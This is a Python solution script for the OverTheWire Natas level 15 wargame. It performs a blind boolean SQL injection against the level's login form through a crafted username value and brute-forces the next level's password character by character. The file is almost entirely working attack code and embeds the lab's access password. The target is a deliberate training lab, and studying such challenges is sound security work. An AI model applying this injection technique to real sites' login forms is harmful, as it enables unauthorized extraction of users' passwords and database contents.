import requests
import string

const = ""
for i in range(len("AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")):
  c = const
  for entry in string.ascii_letters + string.digits:
      Payload = {'username': 'natas16" AND (BINARY password LIKE "{0}%" OR password = "{0}") AND  ""="'.format(const + entry)}
      Response = requests.post('http://natas15.natas.labs.overthewire.org/', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Payload)
      print(entry)
      if "This user exists." in Response.text:
        const += entry
        print(const)
        break
  if const == c:
    break
print(const)